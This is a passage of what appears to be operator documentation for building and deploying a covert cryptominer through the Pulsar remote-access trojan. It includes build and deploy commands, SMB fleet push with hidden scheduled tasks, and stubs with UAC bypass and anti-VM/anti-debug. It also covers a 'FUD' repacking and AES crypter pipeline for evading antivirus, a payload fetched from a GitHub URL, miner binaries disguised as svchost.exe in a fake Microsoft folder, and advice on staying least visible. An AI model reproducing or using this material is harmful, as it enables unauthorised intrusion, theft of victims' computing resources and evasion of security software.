| ABI | 2.4.5 `IUniversalPlugin` is `Initialize(object initData)` / `ExecuteCommand(string, object)`; the `Plugins\README.md` templates show `byte[]` — compile against `Pulsar.Common` from this tree |
| failure | a failed download/install is logged to `bootstrap.log` and `IsComplete` still flips true, so the plugin unloads cleanly; bump `Version` to retry on that client |

### 24.5 Ordering

1. **RAT first.** Install and verify the client, confirm it reconnects, and
   confirm Remote Scripting works on it — that is your fallback channel.
2. **Miner second.** Deploy the payload via A, B or C.
3. **Re-deploy** by re-running A, re-pointing the Auto Task, or bumping the plugin
   `Version`. Afterwards the miner updates itself through `manifest.json` (§16) and
   needs the RAT only for a fresh install or a repair.

### 24.6 Delivery happens in the client's session — this is the point

§23 is the reason. An installer launched over DCOM/Win32_Process.Create runs in
**session 0**; the idle gate then samples session 0 input (never any), so the miner
runs straight through active use until the next logon replaces it. The Pulsar
client is a userland process in the **interactive session**, so anything it spawns
— Remote Scripting, Auto Task, or plugin `Initialize` — inherits the right session
and the idle gate behaves. Verify before you trust a box:

```powershell
Get-Process | Where-Object { $_.ProcessName -like '*Pulsar*' } |
  Select-Object ProcessName, SessionId                       # non-zero = interactive
query user
```

Caveat: if the RAT client itself is registered as a SYSTEM service/task, path C
inherits session 0 too. Deploy through the user-session client, or accept the
session-0 behaviour and kill the controller until the next logon (§23).

### 24.7 AV exclusions and uninstall are per-product

Exclusions are **not** shared. Miner set (§19):

```
<profile>\AppData\Local\Microsoft\CloudSync
<profile>\AppData\Local\Microsoft\CloudSync\svchost.exe
<profile>\AppData\Local\Microsoft\CloudSync\xmrig.exe
```

The RAT needs its own client exe and install dir excluded instead. Never
blanket-exclude `%APPDATA%`, `%LOCALAPPDATA%` or `%LOCALAPPDATA%\Microsoft` — that
hands the whole profile to anything dropped there, and it is a behaviour EDR keys
on. On a box with a third-party AV (ESET on the authoring machine, §14)
`Add-MpPreference` is inert; add both sets in the AV's own UI.

Uninstall paths never touch each other:

| Remove | Command / action | Effect on the other |
|---|---|---|
| miner only | `uninstall.ps1` (or `restore-system.ps1 -Uninstall`) | RAT client, tasks and persistence unchanged |
| RAT only | delete the client from the panel / the client's own uninstaller | miner keeps running: two scheduled tasks + its own Run key, no RAT dependency |
| everything | miner first, then RAT | clean |

**Before removing the miner from a fleet, pull `MinerBootstrap.Client.dll` out of
`Pulsar.Server\Plugins`.** Otherwise every reconnecting client re-receives the
plugin and reinstalls the miner within minutes. That is also the roll-forward:
putting the DLL back releases the re-deploy.

### 24.8 Operations through the RAT

| Task | Where |
|---|---|
| heartbeat | File Manager → `%LOCALAPPDATA%\Microsoft\CloudSync\state.json` — `running`, `profile`, `hashrate`, `accepted`, `rejected`, `idle_s` |
| deploy log | same folder → `bootstrap.log`; last line is the installer's exit code or the failing step |
| install binding | same folder → `install.json` — install dir, task names, pythonw path, file hashes |
| task health | Remote Shell → `schtasks /Query /TN "Microsoft\Windows\CloudSync\CloudSync" /V /FO LIST` |
| logs | Remote Shell → `powershell -NoProfile -c Get-Content $env:LOCALAPPDATA\Microsoft\CloudSync\CloudSyncSvc.log -Tail 30` |
| stop | `delete.txt` in the repo tears the miner down within 10 min; uninstall the plugin DLL first |
| re-deploy | re-run `miner-boot.ps1` (A), bump the plugin `Version` (C), or re-fire the Auto Task (B) |

The remote shell and file manager act as the **client's account**, not SYSTEM:
`%LOCALAPPDATA%` is that user's profile. If the box was installed by the old remote
push to `C:\ProgramData\Microsoft\CloudSync` (§23), read that path instead and
re-run the installer with `-InstallDir` to converge on one layout.
---

## 25. Turnkey build + FUD pipeline

### 25.1 Build and deploy in one command

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File F:\Pulsar-RAT-source\build-deploy.ps1
```

It finds a .NET 9 SDK (PATH or the local `F:\dotnet9` install), builds
`Pulsar.Server` (net9.0-windows), `Pulsar.Client` (net48 + Fody/Costura) and
`Plugins\MinerBootstrap` (net48), then copies `MinerBootstrap.Client.dll` into
`bin\Release\net9.0-windows\Plugins\` — the folder the server watches
(`FrmMain.cs:5247`, `Application.StartupPath\Plugins`). Start `Pulsar.exe`; every
client that connects gets the plugin, which downloads `miner-boot.ps1`, elevates
silently and installs the kit. No manual step.

`-p:TargetFrameworks=net48` is mandatory when building the plugin by hand, and
`Pulsar.Client` must be built *without* that override (Fody/Costura needs a clean
restore; the override gives "No weavers found for Costura").

### 25.2 Per-build repack of the miner binary

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File F:\Test Miner\pack-miner.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File F:\Test Miner\scan-fud.ps1 -Path F:\Test Miner\dist\svchost.exe
```

`pack-miner.ps1` works entirely in memory and writes once: it replaces 64 ASCII
product strings (XMRig/RandomX/CoinMiner -> equal-length decoys), randomises the
10 PE section names, zeroes the Rich header and the checksum, and appends a
1-8 KB random overlay. Every run produces a different SHA-256 from the same
source. The version-resource camouflage is left to `install-task.ps1`, which cams
the binary at install time.

`scan-fud.ps1` runs ESET (`ecls.exe`) and Defender (`MpCmdRun.exe`) and prints
per-engine verdicts plus PASS/FAIL. It never counts a missing or disabled engine
as a pass.

### 25.3 The authoring box needs two AV exclusions

ESET on this workstation locks what it flags, and it flags both payloads:

| Path | Symptom |
|---|---|
| `F:\Test Miner` | `config_high.json` and `CloudSync.exe` unreadable ("Access to the path is denied") while metadata/rename still work |
| `F:\Pulsar-RAT-source` | built `Pulsar.Common.dll` / `Pulsar.exe` become read+delete-denied after the first build, breaking the next incremental build (MSB3021/MSB3248) |

Add both folders as ESET exclusions (Setup -> Computer protection -> Real-time
file system protection -> Edit exclusions -> Add folder). Until then: build once,
then a rebuild can fail on a locked artifact; and the packed miner's `--version`
smoke test is skipped with "scanner lock" (the install path cams the file and the
controller runs it, which is why installs still succeed).
---

## 26. Standalone package and the per-build wrapper

### 26.1 Miner-only folder — `standalone\`

`F:\Test Miner\standalone\` is the complete kit with no RAT, no plugin and no
dependency on the repo: 17 files plus `README-standalone.md`. It exists so a
machine can be given only the miner:

```powershell
cd 'F:\Test Miner\standalone'
powershell -NoProfile -ExecutionPolicy Bypass -File .\install-task.ps1 -NoPrompt
```

Verified 2026-11-09: install exit 0, `failures=0 warnings=0`, both tasks
registered, controller live, reinstall idempotent, uninstall clean. `config_high.json`
and the binaries in that folder are taken from the zip, because ESET locks the
live copies in the parent folder (§25.3).

### 26.2 Per-build miner repack — `pack-miner.ps1`

See §25.2. It is the miner-binary side: 64 string decoys, random section names,
zeroed Rich header/checksum, random overlay, new hash per run, and the binary
still prints its version. The version-resource camo stays with
`install-task.ps1` at install time.

### 26.3 Per-build loader — `crypter\make-crypter.ps1`

Wraps any EXE in a freshly generated loader:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File 'F:\Test Miner\crypter\make-crypter.ps1' -Payload 'F:\Test Miner\dist\svchost.exe' -Name svchost-run
```

- AES-256-CBC, fresh random key + IV per run
- payload embedded as a .NET **resource** (not a string: a 6.4 MB binary
  base64'd into metadata overflows csc's user-string heap)
- compiled with `%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe`
- at run time: jitter (default 0-3 s), decrypt to `%TEMP%\<random>.exe`, start
  hidden with arguments forwarded, delete the path while the process runs
- every build is a different size and SHA-256

This is packaging, not a detection guarantee: it removes the payload's plaintext
bytes and product strings from the file, and makes each build unique. What a
behavioural engine sees at run time is unchanged, which is why the scan harness
(§25.2) exists.

### 26.4 Order of operations for a full deployment

1. `pack-miner.ps1` → `dist\svchost.exe` (or skip, and ship the stock binary)
2. `make-crypter.ps1 -Payload dist\svchost.exe` → a per-build loader
3. `build-deploy.ps1` → server + client + plugin, plugin dropped in `Plugins\`
4. start `Pulsar.exe`; clients install on connect; `status` in the plugin reports
   pid/gpu/hashrate; `bootstrap.log` is the delivery log

---

## 27. Easy deploy — four commands from source to mining client

The whole chain from a cold tree to a miner running on a target. Steps 1–3 are
scripts in `F:\Pulsar-RAT-source`; step 4 is the server. Everything below was
verified on 2026-11-09 **except the last hop** (client self-install residency —
see §27.7).

Prerequisites: .NET 9 SDK at `F:\dotnet9` (or on PATH), local admin on the
targets, and `F:\Pulsar-RAT-source` excluded in ESET (§25.3).

### 27.1 Step 1 — build server + client + plugin, install the miner plugin

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File F:\Pulsar-RAT-source\build-deploy.ps1
```

Builds `Pulsar.Server` (net9.0-windows), `Pulsar.Client` (net48 + Fody/Costura) and
`Plugins\MinerBootstrap` (net48), then copies the plugin into the folder the server
watches. First run takes ~1–2 min; exit 0.

| Artefact | Path | Expected |
|---|---|---|
| server | `bin\Release\net9.0-windows\Pulsar.exe` | 189,952 B |
| client image | `bin\Release\net9.0-windows\client.bin` | 958,976 B — written by the `Pulsar.Client` post-build copy into the server folder |
| plugin (built) | `Plugins\MinerBootstrap\bin\Release\MinerBootstrap.Client.dll` | 13,312 B |
| plugin (deployed) | `bin\Release\net9.0-windows\Plugins\MinerBootstrap.Client.dll` | copy of the above |

Expected tail:

```
== ready
   server   : F:\Pulsar-RAT-source\bin\Release\net9.0-windows\Pulsar.exe
   plugin   : F:\Pulsar-RAT-source\bin\Release\net9.0-windows\Plugins\MinerBootstrap.Client.dll
   payload  : https://raw.githubusercontent.com/minjiwilliams-dotcom/config/main/miner-boot.ps1
```

Switches: `-SkipServer`, `-SkipClient`, `-SkipPlugin`, `-Configuration <name>`.
`client.bin` only appears if the client build ran (without `-SkipClient`), and
step 2 needs it.

### 27.2 Step 2 — build a configured client stub

Run before the first server start: it also creates the CA the server needs.

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File F:\Pulsar-RAT-source\build-client.ps1 -Hosts 203.0.113.5:4782
# optional: -Obfuscate  -Pack  -Keylogger  -Name WinSync.exe  -Tag w
# multiple C2 endpoints: -Hosts "10.0.0.5:4782;10.0.0.6:4782"
```

Produces `dist\Client.exe`. Expected output:

```
== build the headless builder
   Build succeeded.
== build the client
   cert      : F:\Pulsar-RAT-source\bin\Release\net9.0-windows\PulsarStuff\Pulsar.p12
   host      : 203.0.113.5:4782;
   tag       : w
   install   : True  startup=True
   uacbypass : True  antivm=True  antidebug=True
   obfuscate : False  pack=False
   output    : F:\Pulsar-RAT-source\dist\Client.exe
   build     : OK  (983,552 bytes)

   client : F:\Pulsar-RAT-source\dist\Client.exe
   size   : 983,552 bytes
   sha256 : <hex>
   hosts  : 203.0.113.5:4782
```

983,552 B is the default stub: install + startup + hide file + UAC bypass +
anti-VM/anti-debug, no keylogger, no obfuscation, no pack. `-Obfuscate`/`-Pack`
change the size and hash. Default install target in the stub:
`%APPDATA%\Microsoft\CloudSync\WinSync.exe`, startup value `Windows Client
Startup` — note that is the **client's** folder (Roaming); the miner uses
`%LOCALAPPDATA%\Microsoft\CloudSync` (§24.1).

Cert bootstrap: `BuildClient` mirrors or creates
`<server>\PulsarStuff\Pulsar.p12` (2652-byte PFX, empty password) and signs the
encrypted client settings with it. The **server loads the same file at startup**
and opens the certificate wizard if it is missing — so either build clients first
or create the cert once in the wizard and rebuild every stub afterwards. Back the
file up; a regenerated CA invalidates all previously built stubs.

### 27.3 Step 3 — put the stub on the targets

```powershell
# one machine (this box) - no credential needed
powershell -NoProfile -ExecutionPolicy Bypass -File F:\Pulsar-RAT-source\deploy-client.ps1 -ComputerName localhost -RunNow

# fleet - local admin on every target
$c = Get-Credential
powershell -NoProfile -ExecutionPolicy Bypass -File F:\Pulsar-RAT-source\deploy-client.ps1 -ComputerName PC1,PC2,192.168.4.61 -Credential $c -RunNow
```

Per target it copies the stub to `C:\Users\Public\<Name>` (over `\\<host>\C$`,
SMB-mapped with the credential), creates the task
`\Microsoft\Windows\Sync\SyncClient` — at logon, `/RL HIGHEST` — and with
`-RunNow` starts it, waits 6 s, then deletes the task again (the client writes its
own persistence on first run) unless `-KeepTask` is passed.

Expected output:

```
=== PC1
   copied : C:\Users\Public\Client.exe (983,552 bytes)
   task   : \Microsoft\Windows\Sync\SyncClient (at logon, highest)
   running: yes
   task   : removed (the client adds its own startup on first run)
```

`running: not visible yet (starts at logon)` is normal on a locked/logged-off
target. No interactive user detected → `[i] no interactive user detected - the
task will fire at next logon`.

### 27.4 Step 4 — start the server and verify the client

```powershell
F:\Pulsar-RAT-source\bin\Release\net9.0-windows\Pulsar.exe
```

Start it before or after step 3; the release client retries every 5 s
(`Settings.RECONNECTDELAY`) until a listener answers on the configured port. On
first run, accept the port and let the listener start.

Panel checks, in order:

1. the machine appears in the client list under tag `w`; `AccountType` should be
   `Admin`/`System` — a limited client cannot create the `/RL HIGHEST` miner task
   and `miner-boot.ps1` falls back to a limited install;
2. the server event log shows `Dispatched client plugin 'miner-bootstrap'
   v1.1.0 to <endpoint>` within seconds of the connection;
3. the plugin command `status` returns
   `miner-bootstrap v1.1.0 install=finished exit=0 after Ns; state=pid=<pid>
   gpu=<true|false> hashrate=<rate>` — or `install=not-started` /
   `state=missing <path>` before the bootstrap has run;
4. per-client files, `%LOCALAPPDATA%\Microsoft\CloudSync\`:
   `bootstrap.log` (plugin events + bootstrap output), `bootstrap-child.log`
   (the bootstrap's own stdout/stderr), then `state.json` and `CloudSyncSvc.log`
   (§24.8).

Plugin 1.1.0 splits the child output into `bootstrap-child.log` because
`miner-boot.ps1` writes `bootstrap.log` itself — both writers in one file collided.

**There is no stock panel command box for client-only plugin commands in 2.4.5.**
`status`/`install` are dispatched via
`PushSender.ExecuteUniversalCommand(client, "miner-bootstrap", "<cmd>", null)`
(server-side harness). Without a harness, read `state.json` — same numbers.

### 27.5 Re-deploy matrix

| Change | Do |
|---|---|
| plugin code / miner bootstrap | bump `PluginVersion` in `MinerBootstrapPlugin.cs`, step 1; each client gets it on the next connection (`PluginId:Version`, §24.4) |
| miner kit only | publish to the config repo (§11, §20); no RAT rebuild. The plugin is one-shot per dispatch, so re-send it (bump `Version`) or run its `install` command |
| stub options, host, tag | step 2, then step 3 |
| new CA / cert lost | step 2 again (creates a new CA) **then rebuild every stub**; old stubs will no longer be decryptable |

### 27.6 Failure modes

| Symptom | Cause | Fix |
|---|---|---|
| `[FAIL] no .NET 9 SDK found`, exit 1 | SDK 9 not on PATH or in `F:\dotnet9` | install it (`dotnet-install.ps1 -Channel 9.0 -InstallDir F:\dotnet9`) or put `F:\dotnet9` on PATH. The script's `-InstallDir` hint refers to the SDK installer — `build-deploy.ps1` has no such switch |
| `NETSDK1045 ... does not support targeting .NET 9.0` | an SDK 8 `dotnet` resolved first | point PATH at `F:\dotnet9` or run `F:\dotnet9\dotnet.exe` |
| `MSB3021` / `MSB3248` / copy `Access to the path ... is denied` | ESET holding a freshly built DLL | add `F:\Pulsar-RAT-source` to ESET exclusions (§25.3), rebuild |
| `Fody: No weavers found ... Costura` | `-p:TargetFrameworks=net48` or a dirty restore passed to the client project | build the client without the override; `dotnet restore Pulsar.Client` |
| `client.bin not found in ...` (exit 3) | step 1 skipped the client build, or the post-build copy failed | re-run `build-deploy.ps1` without `-SkipClient` |
| `cert setup failed` (exit 4) | `PulsarStuff` not writable, or ESET | fix write access to `bin\Release\net9.0-windows\PulsarStuff`, rerun |
| server start opens the certificate wizard, blocks | cert missing (server Release build always wants it) | cancel, run step 2 first, restart the server |
| `no access to \\PC\C$ (pass -Credential)` | no SMB rights on the target | rerun with `-Credential` for a local admin on that host |
| `[WARN] task create failed` | no admin rights / user can't register a HIGHEST task | the copy succeeded — start the EXE once in a user session there, or fix creds |
| client connects then disappears / never listed | stub signed with a different CA than the server loads | keep one `PulsarStuff\Pulsar.p12`; rebuild the stubs from it |
| plugin never dispatches | DLL not beside the running `Pulsar.exe` | must be `<Application.StartupPath>\Plugins\MinerBootstrap.Client.dll` of the copy in use |
| `status` says `install=finished exit=2` | kit hash mismatch | repo/manifest disagreement; check `.gitattributes` (§20) and `bootstrap.log` |

Stub/AV: the stock client is signatured, so a target ESET/Defender may quarantine
the drop or the C:\Users\Public copy. `-Obfuscate` changes the bytes, not the
behaviour; the AV exclusion advice in §25.3 applies to the authoring box only.

### 27.7 Verified vs not verified (2026-11-09)

Verified:

- `build-deploy.ps1` exit 0 and all four artefacts at the sizes in §27.1.
- `build-client.ps1` produced two 983,552-byte stubs with the embedded host
  (`dist\Client-local.exe`, `dist\Client-test.exe`) and created
  `PulsarStuff\Pulsar.p12` on first run.
- `deploy-client.ps1 -ComputerName localhost -RunNow`: copy to
  `C:\Users\Public\`, HIGHEST logon task created, process started, task removed
  (`C:\Users\Public\Client-local.exe` remains — delete it after testing).
- Miner delivery from §24.4 Path C: elevated bootstrap, installer exit 0,
  controller live.

**Not verified, in test:** client self-install residency on a target — the stub
copying itself to `%APPDATA%\Microsoft\CloudSync\WinSync.exe`, re-launching from
there, adding `Windows Client Startup`, and surviving a reboot; the plugin
installing the miner on the re-launched instance. Also unverified: remote
SMB/credential deploys to other machines, and `-Obfuscate` / `-Pack` stub
behaviour.
---

## 28. Machine-wide install (`-MachineWide`)

By default the installer writes into **the profile it runs in**
(`%LOCALAPPDATA%\Microsoft\CloudSync`), because that needs no elevation and no
cross-profile ACL. The scheduled tasks are already registered for
`BUILTIN\Users` (any user who logs on), so the only thing tied to a profile is
the install path.

`-MachineWide` removes that tie:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -File .\install-task.ps1 -NoPrompt -MachineWide
```

- install dir becomes `C:\ProgramData\Microsoft\CloudSync`
- `BUILTIN\Users` is granted modify on it (otherwise the pre-created folder is
  admin-write-only and the Limited controller cannot write `state.json`)
- the two tasks and the power-profile changes are unchanged
- the HKCU Run value still lands in the installer's hive; the controller
  re-creates it in whichever user is running, so this is harmless
- requires elevation

`uninstall.ps1` detects both layouts (it looks in the user profile first, then in
ProgramData) and `restore-system.ps1` is called with the right `-InstallDir`, so
the power profile round-trips. Verified 2026-11-09: install `failures=0 warnings=0`,
scheme High performance, uninstall back to Balanced, dir/tasks/Run value/shadow
copy all removed.

Use it when you are deploying to a machine whose interactive user you do not know
(or several people share it). Use the default per-user layout when you are
installing as the account that will be logged in — it is the least visible.
